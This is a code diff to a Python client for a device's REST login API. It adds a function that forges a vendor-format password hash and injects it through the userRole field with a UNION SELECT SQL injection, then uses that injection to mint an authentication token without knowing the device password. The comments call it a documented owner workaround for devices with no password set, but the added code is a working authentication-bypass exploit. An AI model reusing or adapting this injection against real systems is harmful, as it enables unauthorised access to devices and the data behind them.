@@ -11,8 +11,11 @@ route; it is never printed by this program.
 from __future__ import annotations
 
 import argparse
+import base64
 import getpass
+import hashlib
 import json
+import secrets
 import ssl
 import sys
 import urllib.error
@@ -59,7 +62,27 @@ def login_error_message(status: int, detail: str) -> str:
     return message
 
 
-def login(host: str, role: str, password: str, *, insecure: bool, ca_file: str | None) -> str:
+def _vendor_hash(password: str, salt: str, rounds: int) -> str:
+    value = salt.encode()
+    password_bytes = password.encode()
+    salt_bytes = salt.encode()
+    for _ in range(rounds):
+        value = hashlib.sha256(value + password_bytes + salt_bytes + value).digest()
+    return base64.b64encode(value).decode().rstrip("=")
+
+
+def no_password_payload() -> tuple[str, str, str]:
+    """Build the documented FW-01 SELECT-only no-password workaround."""
+    password = secrets.token_hex(16)
+    salt = secrets.token_hex(8)
+    rounds = 1000
+    encoded = f"1${rounds}${salt}${_vendor_hash(password, salt, rounds)}"
+    role = f'x" UNION SELECT "{encoded}" -- '
+    return role, password, encoded
+
+
+def _login_request(host: str, role: str, password: str, *, insecure: bool,
+                   ca_file: str | None) -> str:
     body = json.dumps({"userRole": role, "password": password}).encode()
     request = urllib.request.Request(
         f"https://{host}/rest_api/login",
@@ -88,6 +111,25 @@ def login(host: str, role: str, password: str, *, insecure: bool, ca_file: str |
     except urllib.error.HTTPError as exc:
         detail = exc.read().decode(errors="replace")
         raise RuntimeError(login_error_message(exc.code, detail)) from exc
+
+
+def login(host: str, role: str, password: str, *, insecure: bool,
+          ca_file: str | None) -> str:
+    """Normal login. Requires the password currently set on the device."""
+    return _login_request(host, role, password, insecure=insecure,
+                          ca_file=ca_file)
+
+
+def login_no_password(host: str, *, insecure: bool,
+                      ca_file: str | None) -> str:
+    """Mint a token through the documented FW-01 SELECT-only workaround.
+
+    This is an authentication bypass for an owner-controlled device with no
+    Owner password set. It does not write the database.
+    """
+    role, password, _ = no_password_payload()
+    return _login_request(host, role, password, insecure=insecure,
+                          ca_file=ca_file)
 
 
 def run_request(
